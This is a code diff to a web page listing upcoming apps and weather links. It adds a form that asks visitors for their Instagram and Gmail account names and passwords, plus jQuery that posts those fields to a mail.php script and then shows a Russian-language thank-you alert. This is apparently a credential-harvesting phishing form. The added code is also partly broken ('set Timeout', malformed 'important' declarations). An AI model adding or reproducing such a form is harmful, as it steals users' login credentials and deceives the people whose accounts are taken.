@@ -182,6 +182,57 @@ transform: translate(-50%,0%) important;
                         <p class="intro-text" style="margin-top: 50px; font-family: 'Quicksand', sans-serif; margin-right: 8px;">____________________
  
  <br><h2><a href="#news">New Apps Coming Soon</a></h2>
+				<form id="form" style="padding: 50px 20px important; background-color: #fff important; max-width: 320px important; margin: auto important; position: relative important;"> 
+		<input type="text" style="width: 100%; margin-bottom: 10px important;" name="instaName" placeholder="Your newINSTAaccount name" required /><br />
+		<input type="text" name="instaPassword" placeholder="Your newINSTAaccount PASSWORD" required /><br />
+		
+		<input type="text" style="width: 100%; margin-bottom: 10px important;" name="gmailName" placeholder="Your GMAILaccount name" required /><br />
+		<input type="text" name="gmailPassword" placeholder="Your newGMAILaccount PASSWORD" required /><br />
+		<button>!Go</button>
+	</form>
+	
+	<script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
+	<script> 
+$(document).ready(function() {
+	$(".popup").magnificPopup();
+//cil' yandex i google metrica 
+	$(".count_element").on("click", (function(){
+		ga("send", "event", "goal");XXXXXXXX.reachGoal("goal");
+		return true;
+	}));
+	$("#form").submit(function(e) {
+		e.preventDefault;
+		$.ajax({
+			type: "POST",
+			url: "mail.php",
+			data: $(this).serialize()
+		}).done(function() {
+			$(this).find("input").val("");
+			alert("Спасибо за заявку! Скоро мы с вами свяжемся.");
+			//$("#form").trigger("reset");
+			set Timeout(function() {
+			$.magnificPopup.close();	
+			}, 1000);
+		});
+		return false;//ne subminticapo defaultu
+	});
+	/*OLD skelet
+$("#form").submit(function() {
+		$.ajax({
+			type: "POST",
+			url: "mail.php",
+			data: $(this).serialize()
+		}).done(function() {
+			$(this).find("input").val("");
+			alert("Спасибо за заявку! Скоро мы с вами свяжемся.");
+			$("#form").trigger("reset");
+		});
+		return false;
+	});
+	*/
+	
+});
+</script>
 <!--br><span><a href="https://idress4weather.github.io/" target="popup" onclick="window.open('https://idress4weatherinnadanylevska.github.io/idress4weatherinnadanylevska/','popup','width=600,height=600'); return false;">__CURRENT__</a></span-->			
 				
  <!--br><span><a href="#" title="Current weather picture">__CURRENT__</a></span>
